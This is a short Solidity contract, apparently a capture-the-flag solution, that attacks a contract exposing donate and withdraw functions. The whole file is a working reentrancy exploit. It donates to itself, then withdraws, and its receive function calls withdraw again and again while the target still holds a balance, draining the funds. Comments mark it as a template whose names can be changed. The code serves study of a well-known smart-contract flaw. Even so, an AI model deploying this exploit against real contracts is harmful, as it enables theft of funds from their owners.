// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IReentrance { // 1) change interface name

    function donate(address _to) external payable;
    function withdraw(uint256) external;
}

contract ReentranceAttack { // 2) change nameattck

    IReentrance target;

    constructor(address _target) {
        target = IReentrance(_target);
    }

    function attack() external payable {

        target.donate{value: msg.value}(address(this));
        target.withdraw(msg.value);
    }

    receive() external payable {
        if (address(target).balance > 0) {
            target.withdraw(msg.value);
        }
    }
}